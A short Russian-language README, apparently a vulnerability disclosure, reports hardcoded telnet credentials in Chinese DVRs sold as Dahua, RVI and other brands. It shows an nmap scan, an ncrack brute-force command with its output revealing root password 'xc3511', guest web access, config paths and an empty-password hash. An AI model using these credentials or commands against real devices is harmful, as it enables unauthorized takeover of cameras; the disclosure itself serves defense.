<h1>Hardcoded логин\пароль от telntet в китайских DVR, таких Dahua, RVI.</h1>
[English](README.md)[Русский](README-ru.md)
<br/>Так же они могут в продаже под другими брендами.
<br/>
<br/>Nmap report выглядит любопытно:
<br/>Nmap scan report for 192.168.100.15
<br/>Host is up (0.0050s latency).
<br/>Not shown: 65527 closed ports
<br/>
<br/>PORT      STATE    SERVICE        VERSION
<br/>
<br/>23/tcp    open     telnet         BusyBox telnetd
<br/>81/tcp    open     http           uc-httpd 1.0.0 #Web-ui, You can get guest access with guest\<empty> credentials
<br/>445/tcp   filtered microsoft-ds
<br/>4090/tcp  open     ssl/omasgport?
<br/>9527/tcp  open     unknown
<br/>9528/tcp  open     unknown
<br/>34567/tcp open     dhanalakshmi? #This port using for remote veiw in CMS
<br/>34599/tcp open     unknown
<br/>
<br/>Device type: WAP
<br/>Running: Linux 2.4.X
<br/>OS CPE: cpe:/o:linux:linux_kernel:2.4.36
<br/>OS details: DD-WRT v24-sp1 (Linux 2.4.36)
<br/>Network Distance: 5 hops
<br/>Service Info: Host: LocalHost
<br/>
<br/>С помощью ncrack я "восстановил" учетные данные для telnet.
<br/>
<br/>ncrack 192.168.100.15:23 -U logins.txt -P passwords.txt
<br/>Starting Ncrack 0.6 ( http://ncrack.org ) at 2018-05-26 13:06
<br/>Discovered credentials for telnet on 192.168.100.15 23/tcp:
<br/>192.168.100.15:23 23/tcp telnet: 'root' 'xc3511'
<br/>Ncrack done: 1 service scanned in 27.06 seconds.
<br/>Ncrack finished.
<br/>
<br/>Конфигурационные файлы Web-ui хранятся в /mnt/mtd/Config/, но я не разобрался с хэшированым паролем в файле Account1.
<br/>Так же, в моем случае был крайне обрезаный BusyBox и не было возможности использовать sed за замены значения в строке. Хэш пустого пароля - tlJwpbo6.
<br/>
<br/>